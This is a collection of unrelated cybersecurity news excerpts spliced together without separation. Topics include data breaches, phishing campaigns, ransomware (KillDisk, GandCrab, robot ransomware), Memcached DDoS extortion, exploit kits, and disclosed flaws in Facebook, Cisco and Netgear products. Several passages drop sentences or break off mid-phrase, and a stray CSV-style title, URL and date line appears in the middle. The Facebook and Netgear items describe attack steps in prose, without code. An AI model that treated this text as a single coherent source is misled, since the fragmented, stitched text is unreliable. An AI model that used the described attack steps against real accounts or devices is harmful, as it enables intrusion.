According to Olson’s letter, the breach was discovered earlier this year, on Jan. 9, but the company didn’t begin to inform employees until a month later, Feb. 8.
In the letter to Ferguson, Boeing claims it destroyed copies of the spreadsheet and carried out a “forensic examination” of both the Boeing employee’s computer and his spouse’s to ensure it was deleted.
“Both the employee and his spouse have confirmed to us that they have not distributed or used any of the information,” Olson writes.
For its part, Boeing, the second largest defense contractor in the world after Lockheed Martin, said it doesn’t believe its employee’s data has been or will be used inappropriately.

The $2.2 trillion Australian superannuation industry is coming under attack from cybercriminals who are attracted to the high potential gains.
According to Palo Alto Networks, the sheer size of the market, the tendency of people to neglect their superannuation, and technology advancements making it easier to commit identity theft are all factors behind the strong interest among cybercriminals in super funds.
Because superannuation transactions are now conducted digitally, rather than face to face, identity theft has become easier.
Cybercriminals are exploiting a range of techniques, including phishing, to steal victims’ identities before transferring their super into self-managed accounts or applying for hardship payments.
Unlike banks, super funds have no obligation to reimburse victims of fraud, and if the fraud takes place overseas there is very little chance of recovering stolen money, Palo Alto said.
Cybercriminals are also increasingly targeting the industry with malware, with the number of new threats discovered growing to 350,000 per month in 2017, up from just 300 per month a decade ago.
“Because superannuation funds are such valuable targets, cybercriminals are unlikely to turn their attention elsewhere anytime soon.
Therefore, it’s imperative for superannuation providers to review their security measures in minute detail, seeking out every potential vulnerability and finding a way to close the gaps before cybercriminals exploit them,” Palo Alto Regional CSO for APAC Sean Duca said.
“A solid security strategy should go beyond antivirus and intrusion detection systems.

Trade-off between security and usability unlikely to permit systematic surveillance, experts say
• This article was originally published on 13 January 2017.
It has been extensively amended (see endnotes) following a review by the Guardian’s readers’ editor.
A design feature that could potentially allow some encrypted messages to reach unintended recipients is present within the WhatsApp messaging service.
Facebook-owned WhatsApp, which has about one billion users, has not made it widely known that there is an aspect of WhatsApp that results in some messages being re-encrypted and resent automatically, without first giving the sender an opportunity to verify the recipient.
Campaigners have expressed concern about how this aspect of WhatsApp could potentially be exploited to conduct surveillance.
WhatsApp has made privacy and security a primary selling point, and has become a go-to communications tool of activists, dissidents and diplomats.
Its end-to-end encryption relies on the generation of unique security keys using the acclaimed Signal protocol, developed by Open Whisper Systems.
Keys are exchanged between users to guarantee communications are secure from interception by middlemen.
The way WhatsApp implemented the protocol, new keys are generated when – for example – a user gets a new phone or reinstalls the app.
Messages for the user which may have been waiting to be delivered while the user was offline are then re-encrypted and resent by the sender automatically, without the sender having had an opportunity to verify that the recipient is the person intended to receive the message.
A sender is notified after the event if the sender has opted to turn on a notification in settings, but not otherwise.
This aspect of WhatsApp, which increases convenience and reliability of message delivery at the cost of some security, is not inherent to the Signal protocol.
If a recipient’s security key changes while offline, an in-transit message will fail to be delivered and the sender will be notified of the change in security keys without the message having been resent automatically.

KillDisk was one of the components associated with the Black Energy malware that a group of attackers used in December 2015 to hit several Ukrainian power stations, cutting power for thousands of people.
A month before that, it was used against a major news agency in Ukraine.
Since then, KillDisk has been used in other attacks, most recently against several targets from the shipping sector, according to security researchers from antivirus vendor ESET.
However, the latest versions have evolved and now act like ransomware.
Instead of wiping the data from the disk, the malware encrypts it and displays a message asking for 222 bitcoins to restore them.
That's the equivalent of $216,000, an unusually large sum of money for a ransomware attack.
What's even more interesting is that there's also a Linux variant of KillDisk that can infect both desktop and server systems, the ESET researchers said Thursday in blog post.
The encryption routine and algorithms are different between the Windows and the Linux versions, and on Linux, there's another catch: The encryption keys are neither saved locally nor sent to a command-and-control server, and the attackers can't actually get to them.
""The cyber criminals behind this KillDisk variant cannot supply their victims with the decryption keys to recover their files, despite those victims paying the extremely large sum demanded by this ransomware,"" the ESET researchers said.
The good news is that there's a weakness in the encryption mechanism for the Linux version that makes it possible -- though difficult -- for the victim to recover the files.
It's not clear why the KillDisk creators have added this encryption feature.
It could be that they're achieving the same goal as in the past -- destruction of data -- but with the ransomware tactic there's also a small chance that they'll walk away with a large sum of money.

The January attacks against Polish financial institutions through the booby-trapped site of the Polish Financial Supervision Authority are just one piece of a larger puzzle, elements of which are slowly coming to light.
As the indicators of compromise and attack were shared by the affected banks, other institutions around the world found that they have been hit, as well.
The sites were booby-trapped with code that would trigger the download of malicious JavaScript files from other compromised domains (sap.misapor[.
The domains hosted an exploit kit, which leveraged Silverlight and Flash exploits to deliver malware.
According to the researchers’ findings, the site of the Polish Financial Supervision Authority was booby-trapped since at least the beginning of October 2016, but not all visitors were hit.
The IPs only contained the first 3 octets, and would have been used to filter traffic such that only IPs on that subnet would be delivered the exploit and payload.
The IP addresses corresponded to a mix of public and private financial institutions spread across the globe,” BAE Systems researchers shared.
The majority of these institutions are banks in Poland, the US, Mexico, UK, and Chile.

Researchers recently identified a phishing campaign set up to lure unsuspecting Netflix users into giving up their credentials and credit card data.
The campaign – now defunct – started with an email informing users they needed to update their account details.
From there, victims were brought to a legitimate looking Netflix login page where they were asked their email address and Netflix password.
Not content with just getting users’ login credentials, the attacker then directs victims to another form where they’re told they need to update their billing information.
Users are encouraged to enter their name, birthdate, address, and credit card information.
The attacker perhaps overdid it by asking users to provide their social security number – something Netflix would never ask for – and users’ VBV (Verified by Visa) 3D Secure Code, a fairly new service that Visa uses in Europe and India but that hasn’t been deployed in the U.S. yet.
While the pages mimic actual Netflix pages and even feature a yellow “secure server” lock, they’re completely fake.
Mohammed Mohsin Dalla, a researcher with FireEye’s Threat Research team who uncovered the campaign, notes that until it was taken down, the campaign was adept at bypassing phishing filters.
He claims the campaign used AES encryption to encode the content it served up, something that would have made it easy for it to evade detection.
“By obfuscating the webpage, attackers try to deceive text-based classifiers and prevent them from inspecting webpage content,” Dalla wrote of the scam Monday, “this technique employs two files, a PHP and a JavaScript file that have functions to encrypt and decrypt input strings.
The PHP file is used to encrypt the webpages at the server side… at the client side, the encrypted content is decoded using a defined function in the JavaScript file”.
Phishing campaigns that target Netflix customers aren’t revolutionary but this one was different because of the way it evaded detection and served up its phishing pages.
The pages, hosted on legitimate but compromised servers, didn’t appear to users if their DNS linked back to Google or PhishTank, an anti-phishing service that aggregates data on scams like this.
In fact, according to FireEye, if a visitor from Google, Phishtank, or other sites like the Calyx Institute or Netflix itself visited the fake site, the campaign would ensure a “404 Not Found error” message would be displayed – making it less likely the scam would be discovered.
Netflix phishing campaigns have become some of the more ubiquitous scams.
A handful of phony invoice emails made the rounds in the UK earlier this summer trying to trick users into thinking they’d purchased a Netflix subscription and insist they hand over their credit card information.
Another scam, one that was set on convincing Netflix users they needed to update their credit card data, made the rounds earlier last summer, in July.
After entering their information, victims were told their account has been suspended and that they need to download “Netflix support software”.
That software, at least according to the Knoxville, Tenn.
Better Business Bureau, was “remote login software” that handed attackers the keys to victims’ computers.

Researchers found they were able to infect robots with ransomware; in the real world, such attacks could be highly damaging to businesses if robotic security isn't addressed.
Ransomware has long been a headache for PC and smartphone users, but in the future, it could be robots that stop working unless a ransom is paid.
Researchers at security company IOActive have shown how they managed to hack the humanoid NAO robot made by Softbank and infect one with custom-built ransomware. The researchers said the same attack would work on the Pepper robot too.
After the infection, the robot is shown insulting its audience and demanding to be 'fed' bitcoin cryptocurrency in order to restore systems back to normal.
While a tiny robot making threats might initially seem amusing -- if a little creepy -- the proof-of-concept attack demonstrates the risks associated with a lack of security in robots and how organisations that employ robots could suddenly see parts of their business grind to a halt should they become a victim of ransomware.
""In order to get a business owner to pay a ransom to a hacker, you could make robots stop working. And, because the robots are directly tied to production and services, when they stop working they'll cause a financial problem for the owner, losing money every second they're not working,"" Cesar Cerrudo, CTO at IOActive Labs, told ZDNet.
Taking what was learned in previous studies into the security vulnerabilities of robots, researchers were able to inject and run code in Pepper and NAO robots and take complete control of the systems, giving them the option to shut the robot down or modify its actions.
The researchers said it was possible for an attacker with access to the Wi-Fi network the robot is running on to inject malicious code into the machine.
""The attack can come from a computer or other device that is connected to internet, so a computer gets hacked, and from there, the robot can be hacked since it's in the same network as the hacked computer,"" said Cerrudo, who conducted the research alongside Lucas Apa, Senior Security Consultant at IOActive.
Unlike computers, robots don't yet store vast amounts of valuable information that the user might be willing to pay a ransom to retrieve. But, as companies often don't have backups to restore systems from, if a robot becomes infected with ransomware, it's almost impossible for the user to restore it to normal by themselves.
If the alternative for a victim of robot ransomware is waiting for a technician to come to fix the robot -- or even losing access it to weeks if it needs to be returned to the manufacturer -- a business owner might view giving into the ransom demand as a lesser evil.
""If it's one robot then it could take less time, but if there are dozens or more, every second they aren't working, the business is losing money. Keeping this in mind, shipping lots of robots takes a lot of time, so the financial impact is bigger when you have a computer compromised with ransomware,"" said Cerrudo.
While the robot ransomware infections have been done for the purposes of research -- and presented at the 2018 Kaspersky Security Analyst Summit in Cancun, Mexico -- IOActive warn that if security in robotics isn't properly addressed now, there could be big risks in the near future.
""While we don't see robots every day, they're going mainstream soon, businesses worldwide are deploying robots for different services. If we don't start making robots secure now, if more get out there which are easily hacked, there are very serious consequences,"" said Cerrudo.
As with security vulnerabilities the Internet of Things and other products, the solution to this issue is for robotics manufacturers to think about cybersecurity at every step of the manufacturing process from day one.
IOActive informed Softbank about the research in January but Cerrudo said: ""We don't know if they [Softbank] are going to fix the issues and when, or even if they can fix the issues with the current design.""
Responding to the IOActive research, a Softbank spokesperson told ZDNet: ""We will continue to improve our security measures on Pepper, so we can counter any risks we may face.""

Anonymous hackers have stolen and leaked 1.9 million email addresses and some 1,700 names and active phone numbers of Bell Canada customers.
The company has not shared where the stolen information was stored and how they attackers managed to access it, because the Royal Canadian Mounted Police cyber crime unit’s investigation into the matter is still ongoing.
But, according to a brief statement, the affected systems have been secured, the Office of the Privacy Commissioner of Canada informed, and affected users notified directly (either via email or phone).
“There is no indication that any financial, password or other sensitive personal information was accessed,” the company noted, and added that the incident is not connected to the recent global WannaCry malware attacks.
They’ve also warned customers to be on the lookout for phishing emails or calls impersonating the company and asking the customers for credit card or personal information.
According to The Globe and Mail, the attackers are threatening to release more of the stolen data, if the telecom company doesn’t co-operate with them.
It’s unclear what they mean by co-operating, but it’s more than likely that they’ve asked to be paid in order not to release the stolen information.
Bell Canada has known about the breach since at least last Wednesday, when they notified the commissioner’s office of it.

DDoS extortionists have already pounced on the Memcached DDoS attack vector in attempts to extract payments from attacked companies.
Akamai revealed earlier today that it detected DDoS attacks executed via Memcached servers that were different from others.
Instead of blasting targets with UDP packets containing random data, one group of attackers is leaving short messages inside these packets.
This one group is asking victims to pay 50 Monero —around $17,000— to a Monero address. The group doesn't say it will stop the attack but only implies it.
Such attacks have first appeared in 2015 and were initially referred to as DDoS-for-Bitcoin after the DD4BTC group that pioneered such tactics. The group would send emails to various companies, threatening to launch DDoS attacks unless they paid a ransom fee.
Even if the group's members were arrested, other factions appeared in subsequent years, using unique names such as Armada Collective or XMR Squad, but also mimicking hacker groups such as Anonymous or LulzSec.
The tactic, now known as ransom DDoS (RDoS), has become quite popular among cybercriminal groups, and there have been too many RDoS campaigns to remember in the past years.
In most past cases, attackers didn't have the firepower to launch DDoS attacks if victims ignored the ransom demand. But the Memcached-based DDoS extortions are different.
Attackers clearly have the DDoS cannon to take down companies, mainly due to the large number of unsecured Memcached servers they can abuse to launch these attacks.
Victims are also more likely to pay, seeing that they're under a heavy attack and this isn't just an empty threat.
But according to Daniel Smith, a Radware security researcher who spoke with Bleeping Computer, paying the Monero ransom won't help companies at all.That's because attackers have used the same Monero address for multiple DDoS attacks against different targets. Here's the same Monero address from the Akamai attacks, but spotted by a different security researcher.
Attackers wouldn't have the ability to tell which of the multiple targets they attacked paid the ransom. The general consensus is that this group is using a carpet bombing technique, hitting as many targets as possible for short bursts, hoping to scare one into paying.
""Multiple targets are sent the same message in hopes that any of them will pay the ransom,"" Akamai said in a report today, echoing Smith's recommendation not to pay the ransom.
""There is no sign to suggest that they are actively tracking the targets reaction to the attacks, no contact information, no detailed instructions on payment notification,"" Akamai added. ""If a victim were to deposit the requested amount into the wallet, we doubt the attackers would even know which victim the payment originated from, let alone stop their attacks as a result.""

Employees of US NGOs Fight for the Future and Free Press were targeted with complex spear-phishing attempts between July 7 and August 8, reported today the Electronic Frontier Foundation (EFF). Both organizations targeted in the attacks are currently fighting against for Net Neutrality in the US.
Based on currently available evidence, the attacks appear to have been orchestrated by the same attacker, located in a UTC+3-5:30 timezone, said EFF Director of Cybersecurity Eva Galperin and EFF security researcher Cooper Quintin.
At least one victim fell for the attacks
""Although this phishing campaign does not appear to have been carried out by a nation-state actor and does not involve malware, it serves as an important reminder that civil society is under attack,"" said the two today.
""It is important for all activists, including those working on digital civil liberties issues in the United States, to be aware that they may be targeted by persistent actors who are well-informed about their targets’ personal and professional connections.""
At least one victim fell for the 70 fake emails sent during the phishing attempts. Attackers didn't deliver malware but lured victims away on a remote site designed to phish Google, Dropbox, and LinkedIn credentials.
""The attackers were remarkably persistent, switching up their attacks after each failed attempt and becoming increasingly creative with their targeting over time,"" EFF said.
The most creative of the spear-phishing emails was when victims received emails with the subject line ""You have been successfully subscribed to Pornhub.com,"" or ""You have been successfully subscribed to Redtube.com,"" two very popular adult video portals.
Minutes later, victims received another email made to look like it was coming from the same two services. These second emails contained explicit subject lines.
Because spear-phishing emails were aimed at work emails, most victims would have been inclined to unsubscribe from the incoming emails. This was the catch, as attackers doctored the unsubscribe link, leading victims to a fake Google login screen.

Attackers used different tactics as the campaign progressed
The PornHub and RedTube phishes were not the only ones. Attackers also used other tactics.
⬭ Links to generic documents that asked users to enter credentials before viewing.
⬭ LinkedIn message notifications that tried to trick users into giving away LinkedIn creds.
⬭ Emails disguised to look like they were coming from family members, sharing photos, but which asked the victim to log in and give away credentials instead.
⬭ Fake email notifications for hateful comments posted on the target's YouTube videos. When the victim followed the link included in the email, the target would have to enter Google credentials before performing the comment moderation actions.
⬭ Emails that looked like a friend was sharing interesting news stories. Used topics and subject lines include:
                 - Net Neutrality Activists 'Rickroll' FCC Chairman Ajit Pai
                 - Porn star Jessica Drake claims Donald Trump offered her $10G, use of his private jet for sex
                 - Reality show mom wants to hire a hooker for her autistic son

In one case, one of the targeted activists received a request from a user asking for a link to buy her music. When the target replied, the attacker answered back with a Gmail phishing link, claiming the buy link didn't work. EFF experts say that victims who had two-factor authentication turned on for their accounts would have prevented attackers from logging into their profiles even if they had managed to obtain their password.

Netskope Threat Research Labs has discovered that the latest Microsoft Office zero-day vulnerability is linked to the Godzilla botnet loader discussed in our recent blog. During our research, we observed the IPs related to the Godzilla Botnet loader serving payloads associated with exploits for the latest zero-day vulnerability in Microsoft Office. Microsoft has said that the vulnerability will be patched today. Netskope Threat Protection detects the known exploits for this new vulnerability as Backdoor.Explot.ANWK. The payload for the exploit are detected as Backdoor.Generckd.4818242 and Backdoor.Generckd.4818381.
This vulnerability allows a malicious actor to execute a Visual Basic script, when the victim opens a document containing an embedded exploit. An excerpt of the VBScript code embedded in the document is shown in Figure 1.

Freelance security researcher Dan Melamed has done us all a solid.
Then, he did the right thing: he reported it to Facebook.
Melamed said in a blog post on Monday that he’d discovered the critical vulnerability in June.
Besides finding a kill switch for any public video, he also discovered he could disable commenting on any video.
Melamed had looked at the HTTP request that his browser sends to Facebook when he uploads a video.
Using a program called Fiddler, he intercepted the request, swapped out his video’s ID for one belonging to a victim’s video, and then sent the modified request on its way to Facebook.
Melamed’s method is simple: first, an attacker would either create a public event on Facebook or visit any existing public event.
Then, they’d go to the event’s Discussion tab and create an event post by uploading a photo or video.
He found that when you swap the value of the composer_unpublished_photo[0] parameter for the ID of the Facebook video you want to kill, the server will balk, putting out this error message:
This content is no longer available.
Error message or no error message, the video will still successfully attach itself to the created event post.
When an attacker refreshes the Events Discussion page, they’d see that the event posting had appeared with the victim’s video attached.
Then, it’s just a matter of clicking a small arrow dropdown and choosing “Delete Post”.
A dialog box will warn that the video will also be removed from Photos and Videos.
If you confirm in the dialog box that yes, you want to delete the video, Poof!
Credit where credit’s due, Melamed noted that this vulnerability is similar to another video deletion bug that Indian security researcher and penetration tester Pranav Hivarekar discovered, also in June 2016.
In a nutshell: whereas Hivarekar’s flaw had to do with attaching a victim’s video to a comment, Melamed discovered a way to attach the video to an event post.
Delete the bath water/event post, and that baby/video gets tossed right out with it.
This one had to do with how one man could have deleted any Facebook photo album that he could see.
Mark offers this digression: In Melamed’s attack on videos, he specifies the ID of a video he’s targeting specifically, but since video IDs are just numbers, he could have just guessed one and wiped out a video at random.

While combing through WikiLeaks’ Vault 7 data dump, Cisco has unearthed a critical vulnerability affecting 300+ of its switches and one gateway that could be exploited to take over the devices.
The flaw is present in the Cisco Cluster Management Protocol (CMP) processing code in Cisco IOS and Cisco IOS XE Software.
“The vulnerability is due to the combination of two factors: the failure to restrict the use of CMP-specific Telnet options only to internal, local communications between cluster members and instead accept and process such options over any Telnet connection to an affected device, and the incorrect processing of malformed CMP-specific Telnet options,” Cisco explained.
An exploit could allow an attacker to execute arbitrary code and obtain full control of the device or cause a reload of the affected device”.
The extensive and complete list of affected devices is provided in the security advisory.
Cisco says that they are not aware of any public announcements or active malicious use of the vulnerability, and that they will provide free software updates to address it (they don’t say when).
In the meantime, users can mitigate the risk by disabling the Telnet protocol and switching to using SSH.
If that’s not possible, they can reduce the attack surface by implementing infrastructure access control lists.
It also includes indicators of compromise that can be used to detect exploitation attempts.

Over the past few weeks, hackers have targeted thousands of publicly accessible servers running database software such as MongoDB and Hadoop, and held their data for ransom.
Now someone is apparently taking matters into their owns hands, helpfully alerting admins that their databases are vulnerable to attack.
""It looks like a friendly warning,"" Victor Gevers, chairman of the non-profit GDI Foundation which discloses security issues to affected victims, told Motherboard in a Twitter message.
Gevers has been tracking the malicious attacks since they began in December, and on Monday started following this rather strange twist.
But the vigilante, whoever they may be, is creating an empty folder called ""your_db_is_not_secure"" in some open databases.
So far, the message has been placed into 49 of the 2,641 open databases using the Cassandra software, Gevers told Motherboard.
It's not clear how effective this approach will actually be at informing potential victims, however, considering that database administrators might not even notice the slight change.
Gevers recently wrote in a tweet that the GDI Foundation has been informing victims too via email, and another group of security experts tried sending emails en masse automatically to potential targets.
If the messages don't get through to database owners, maybe the ransom notes will.

The short version of the 2014 vulnerability is that an attacker can get unauth.cgi to issue a number that can be passed over to passwordrecovered.cgi in order to receive credentials.
Kenin tested their exploits and was able to get his password.
[ Learn about top security certifications: Who they're for, what they cost, and which you need.
The following day he started gathering other Netgear devices to test.
While repeating the process, he made an error, but that didn't prevent him from obtaining credentials.
That accidental discovery resulted in CVE-2017-5521.
""After few trials and errors trying to reproduce the issue, I found that the very first call to passwordrecovered.cgi will give out the credentials no matter what the parameter you send.
This is totally new bug that I haven’t seen anywhere else.
When I tested both bugs on different NETGEAR models, I found that my second bug works on a much wider range of models,"" Kenin explained in a recent blog post.
There are at least ten thousand devices online that are vulnerable to the flaw that Kenin discovered, but he says the real number could reach the hundreds of thousands, or even millions.
""The vulnerability can be used by a remote attacker if remote administration is set to be Internet facing.
However, anyone with physical access to a network with a vulnerable router can exploit it locally.
This would include public Wi-Fi spaces like cafés and libraries using vulnerable equipment,"" Kenin wrote.
Kenin reached out to Netgear and reported the problems, but it was no easy task.
The first advisory listed 18 devices that were vulnerable, followed by a second advisory detailing an additional 25 models.
A few months later, in June 2016, Netgear finally published an advisory that offered a fix for a small subset of the vulnerable devices, and a workaround for others.
Eventually, Netgear reported that they were going to fix all the unpatched models.
They also teamed up with Bugcrowd to improve their vulnerability handling process.
Netgear has a status page on the vulnerability, they also provide a workaround for those who can't update their firmware yet.
It wasn't until after the story ran that the PR firm representing Trustwave and pitching the research named Simon Kenin as one who made the discovery.
Netgear issued a statement, downplaying the discovery some, and reminding users that fixes are available for most of the impacted devices.
The emailed comments are reprinted below: NETGEAR is aware of the vulnerability (CVE-2017-5521), that has been recently publicized by Trustwave.
We have been working with the security analysts to evaluate the vulnerability.

A decade ago, cross-site request forgery (CSRF, often pronounced “c-surf”) was considered to be a sleeping giant, preparing to wake and inflict havoc on the Worldwide Web.
But the doomsday scenario never materialized and you don’t even seem to hear much about it anymore.
In this blog post, part 1 of 2, I will explore this idea and try to understand why the CSRF giant never awoke.
First we’ll cover the overall threat landscape, trends, and some notable CSRF exploits throughout the years, including one from personal experience.
As a quick review, CSRF exists because web applications trust the cookies sent by web browsers within an HTTP request.
In a CSRF attack, the attacker causes a victim’s browser to make a request that results in a change or action which benefits the attacker (and/or harms the victim) in some way.
Without a specific defense – like a random token in the request body that is validated on the server side – CSRF attacks are possible.
After a bit of testing, my suspicions were confirmed.
All requests that caused any sort of change could be exploited with CSRF.
This included: I contacted the company to let them know about these security holes.
Surprisingly, they didn’t seem to be aware there was such a thing as CSRF, but they thanked me anyway and rolled out a fix about a month later.
There have been other notable instances of CSRF vulnerabilities with some of them being exploited in the wild.
Drive-by pharming is an attack on the DNS settings of home routers and modems and often leverages CSRF as a key element.
The web UIs on these devices are the culprit, because they allow users to edit configuration settings.
In one attack from 2008, banking customers in Mexico who owned 2Wire DSL modems were targeted.
Victims received an email with an embedded image tag with a CSRF attack that changed the DNS settings on their modem.
In another instance, tens of thousands of Twitter users fell victim to a CSRF worm in 2010 when developers failed to implement anti-CSRF measures for tweets.
The vulnerability was discovered and exploited in a rather distasteful but harmless way.
When authenticated Twitter users visited the web page containing the exploit, they unknowingly posted two tweets – one with a link to the same page and another with a message about goats.
Anyone who clicked on the link in the first tweet also posted the same two tweets.
The worm spread like wildfire before it was fixed by Twitter.
In 2012 Facebook’s App Center was vulnerable to CSRF and the security researcher who discovered the flaw was awarded $5000 as a bounty.
Interestingly, in this case the HTTP request included an anti-CSRF token that appeared at first glance to provide protection, but the token was not being validated by the server-side application when the request was received.
A Qualys researcher found other examples where anti-CSRF tokens were not properly validated.
And similar to the Facebook issue mentioned above, PayPal in 2016 did not validate the anti-CSRF token in paypal.me.
An attacker could only change a user’s profile photo in that case however.

A flaw in popular messenger apps WhatsApp and Telegram, which could allow hackers to gain access to hundreds of millions of accounts using the very encryption software designed to keep them out, has been discovered by cyber security firm Check Point.
The Israeli multinational said it was concerned about vulnerabilities in the messaging apps, following WikiLeaks’ ‘Vault 7’ release of more than 8,500 CIA documents.
“One of the most concerning revelations arising from the recent WikiLeaks publication is the possibility that government organizations can compromise WhatsApp, Telegram and other end-to-end encrypted chat applications,” the company said in a blog post.
These online versions mirror all messages sent and received by a user’s mobile device, which deploys end-to-end encryption so that only those sending and receiving messages can view the content.
Hackers could gain access to a user’s account, however, by booby-trapping a digital image with malicious code which would be activated once the image is viewed.
The code could then spread like a virus by sending infected messages to a user's contacts.
“This means that attackers could potentially download your photos and or post them online, send messages on your behalf, demand ransom, and even take over your friends’ accounts,” they added.
Check Point said it alerted both companies to the problem last week and waited for the issues to be resolved before making it public.
Both companies have said they’ve since patched the problem.
“Thankfully, WhatsApp and Telegram responded quickly and responsibly to deploy the mitigation against exploitation of this issue in all web clients,” Check Point Head of Product Vulnerability Oded Vanunu said.
The company has advised, however, that WhatsApp and Telegram web users should restart their browser to ensure they’re using the latest versions of the service.

Facebook users have noticed and reported a new scam making rounds on the popular network.[1] This time, it is the same old Facebook Messenger virus that compromises user accounts and acts on behalf of the victim to distribute the malicious link further.
The scam uses a basic social engineering technique that lures the potential target into clicking on the provided URL. In addition, the victim feels safe since the link comes from one of his Facebook friends. The message usually includes a short line that looks similar to “its you? [name] :|.”
The emoji at the end of the message differs, and the provided link is shortened; therefore the user cannot figure out where it leads. However, the shortcut indicates that the link leads to a mysterious video and triggers victim’s curiosity to check it out.
Typical strategy: Install something to watch the video
Cybersecurity experts are already familiar with the technique used to trick questioning users into installing the Facebook Message Video virus. As soon as the victim clicks the compromised link and enters the phishing website (which apparently is designed to look like YouTube or another popular video sharing platform), a misleading pop-up appears, asking the victim to install an update or an application (it could be a fake Adobe Flash Player or a plug-in).
The file suggested to the user contains no software related to video streaming and simply carries the malicious payload that later compromises victim’s account and sends out the deceptive messages to all victim’s contacts.
Speaking of fake Adobe Flash Players, we want to inform you that these are one of the most dangerous threats to your security. One of the latest cyber attacks was based on fake pop-ups appearing on compromised sites, urging people to install an updated Flash Player. Unfortunately, launching the install_flash_player.exe file only infected the computer with Bad Rabbit ransomware.

Cryptojacking attacks exploded by 8,500% in 2017 resulting from the sudden increase in cryptocurrency values. According to research released by Symantec, UK ranked as the fifth highest country worldwide, with a staggering 44,000% increase in coin-miner detections.
With a low barrier to entry – only requiring a couple lines of code to operate – cyber-criminals are harnessing stolen processing power and cloud CPU usage from consumers and enterprises to mine cryptocurrency. Coin-miners can slow devices, overheat batteries, and in some cases, render devices unusable. For enterprise organizations, coin-miners can put corporate networks at risk of shutdown and inflate cloud CPU usage, adding cost.
Symantec also found a 600% increase in overall IoT attacks in 2017, which means that cyber-criminals could exploit the connected nature of these devices to mine en masse.
“Attackers could be co-opting your phone, computer or IoT device to use them for profit,” said Darren Thomson, CTO and VP EMEA, Symantec. “People need to expand their defences or they will pay the price for someone else using their device.”
The Annual Threat Report also showed that while ransomware was still being used in 2017, there were fewer ransomware families and lower ransom demands. Symantec outlined in its report that “many cyber-criminals may have shifted their focus to coin mining as an alternative to cash in while cryptocurrency values are high” and that “some online banking threats have also experienced a renaissance as established ransomware groups have attempted to diversify.”
Last year, the average ransom demand dropped to $522, less than half the average of the year prior. While the number of ransomware variants increased by 46%, indicating the established criminal groups are still quite productive, the number of ransomware families dropped, suggesting they are innovating less and may have shifted their focus to new, higher value targets.
The report analyzed data from the Symantec Global Intelligence Network, which tracks over 700,000 global adversaries, records events from 98 million attack sensors worldwide and monitors threat activities in over 157 countries and territories.
Threats in the mobile space continued to grow year-over-year, including the number of new mobile malware variants which increased by 54%. According to the report, Symantec blocked an average of 24,000 malicious mobile applications each day last year, citing older operating systems as one of the main causes - only 20% of devices are running the newest version of Android. 
Mobile users also face privacy risks from 'grayware' apps that aren’t completely malicious but can be troublesome - Symantec found that 63% of grayware apps leak the device’s phone number. Unfortunately, with grayware increasing by 20% in 2017, Symantec do not believe this problem will be going away. 
"," Ransomware Out, Cryptojacking In  ", https://www.infosecurity-magazine.com/news/ransomware-out-cryptojacking-in/ , 2018_03_22 
"
A new form of ransomware has emerged which is, unusually, being distributed by two separate exploit kits -- one of which was thought to have disappeared -- and demands payment in a lesser-known form of cryptocurrency.
First seen on January 26, GandCrab has been spotted being distributed by two exploit kits, RIG EK and GrandSoft EK. According to researchers at security company Malwarebytes, it's unusual in itself for ransomware to be pushed using an exploit kit, with such tactics usually reserved for trojans and coin-miners.
 An exploit kit is used by cybercriminals to take advantage of vulnerabilities in systems in order to distribute malware and perform other malicious activities. In contrast, ransomware is usually delivered by spam email. The only other form of ransomware known to be consistently distributed with an exploit kit is Magniber.
GandCrab is distributed via the RIG exploit kit, which uses vulnerabilities in Internet Explorer and Flash Player to launch JavaScript, Flash, and VBscript-based attacks to distribute malware to users.
It's possible that RIG spreads GandCrab to victims using malvertising on compromised websites, in an attack method similar to that used by Princess ransomware.
GandCrab is also distributed using GrandSoft, an exploit kit which first appeared in 2012, but was thought to have disappeared. The GrandSoft EK takes advantage of a vulnerability in the Java Runtime Environment which allows attackers to remotely execute code, and in this case is used to distribute GandCrab.
 Once the payload has been dropped and run on a compromised system, GandCrab, for the most part, acts like any other form of ransomware, encrypting Windows files using an RSA algorithm and demanding payment for the 'GandCrab Decryptor' required to unlock the files.
The encrypted files gain a .GDCB extension, with the encryption loop designed in such a way it will eventually affect every file on the drive.
However, unlike many forms of ransomware, GandCrab doesn't demand payment in bitcoin, but rather in a form of cryptocurrency called Dash.
Those behind the ransomware demand 1.5 Dash (listed on the note as $1,200, although the fluctuating prices mean it's ever changing) as a ransom, a price which doubles to three Dash ($2,400) if the price isn't paid within a few days.
 The demand for payment in Dash represents the latest example of ransomware distributors attempting to move away from bitcoin and onto other cryptocurrency, for reasons ranging from increased privacy and security to other forms of blockchain-based virtual currency being less popular than bitcoin and therefore quicker to process.
There's currently no means of decrypting GandCrab ransomware files for free at this time, meaning the best way to avoid falling victim is to ensure all software updates and patches have been applied to ensure the vulnerabilities exploited by the exploit kits can't be used to distribute ransomware from infected sites.

Six months of relative quiet around exploit kits recently changed when a public proof-of-concept attack disclosed by a Texas startup was integrated into the Sundown Exploit Kit.
The proof-of-concept exploit was developed by Theori, a research and development firm in Austin, which opened its doors last spring.
The PoC targets two vulnerabilities, CVE-2016-7200 and CVE-2016-7201, in Microsoft Edge that were patched in November in MS16-129 and privately disclosed to Microsoft by Google Project Zero researcher Natalie Silvanovich.
French researcher Kafeine said on Saturday that he had spotted weaponized versions of the Theori exploits in Sundown two days after they were made public.
The payload is most likely the Zloader DLL injector, but Sundown has also moved other malware in the past including banking Trojans such as Zeus Panda and Dreambot, and even Bitcoin mining software.
Kafeine said this is the first significant exploit kit activity he’s seen in six months.
This is the second time a Theori proof-of-concept exploit has ended up in an exploit kit, Kafeine said, harkening back to CVE-2016-0189, which was patched in May by Microsoft and yet eventually found its way into Neutrino, RIG, Sundown and Magnitude.
Kafeine said he expects other exploit kits to quickly integrate this attack as well, but activity could be slowed by Christmas and New Year holidays in the West, and the recently concluded Russian holiday season.
A request for comment from researchers at Theori was not returned in time for publication.
In the Readme for the exploits posted to Github, Theori said its PoC was tested on the latest version of Edge running on Windows 10.
The vulnerabilities are in the Chakra JavaScript engine developed for Microsoft in Internet Explorer 9.
The Theori exploits trigger information leak and type confusion vulnerabilities in the browser, leading to remote code execution.
The bugs were patched Nov. 8 by Microsoft in a cumulative update for the Edge browser; Microsoft characterized them as memory corruption flaws and rated them both critical for Windows clients and moderate for Windows server.
An attacker could also embed an ActiveX control marked ‘safe for initialization’ in an application or Microsoft Office document that hosts the Edge rendering engine.
The integration of new exploits, however, has slowed significantly since the erasure of Angler and other popular kits from the underground.
Angler’s disappearance coincided with the June arrests of 50 people in Russia allegedly connected to the development and distribution of the Lurk Trojan.
